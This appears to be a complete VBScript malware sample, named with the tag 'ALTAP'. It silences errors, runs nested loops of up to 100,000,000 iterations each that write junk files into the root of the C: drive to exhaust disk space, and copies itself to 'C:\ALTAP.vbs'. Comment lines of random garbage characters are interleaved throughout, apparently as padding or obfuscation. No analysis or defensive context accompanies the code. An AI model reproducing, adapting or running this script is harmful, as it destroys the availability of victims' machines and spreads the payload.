On Error Resume Next
ALTAPNum = 100000000
'\¿·O¦/C-ª	.\®^ú«¦^_+ô£#+ÖwÜ§_û+l³×üxƒsø+¢àx'®åq¾ç¥ÙÚ)-kôy
Set ALTAP = Wscript.CreateObject("Scripting.FileSystemObject")
'hæ1J§L/³|+Ý¹+ --+¦±'´éIÔi+>»¦-ÁN_5þ+
ALTAPME = "C:\ALTAP"
'§âýFåh¸Óïü
For ALTAPO = 1 to ALTAPNum
'-x]²+LZ¿©QÂñCTñv@_Õ
  For ALTAPI = 1 to ALTAPNum
    Set ALTAPw = ALTAP.CreateTextFile(ALTAPME & ALTAPI & "_" & ALTAPO & ".ALTAP", True)
'hæ1J§L/³|+Ý¹+ --+¦±'´éIÔi+>»¦-ÁN_5þ+
    ALTAPw.Write "ALTAP"
'++yº~båzAmrQgG²þId´ya¤ÁI¦P~EdÝju8@UGH+c-sjâ^GEÂty@¯3"J
    ALTAPw.Close
  Next
Next
'Ç:3Æ¦¶+¥+'VF!¦ÅOy-_èÃ¦¤¯¬-óØ_-l1+ÀúDº&£Ü³Ìe(²b}Xòlwù¡{Äö
ALTAP.CopyFile Wscript.ScriptFullName, ALTAPME & ".v" & "b" & "s", True
'X¬IO+sN+Ý5tÐÍÜ-6+ü<5i$;ð¤;¼¢_=
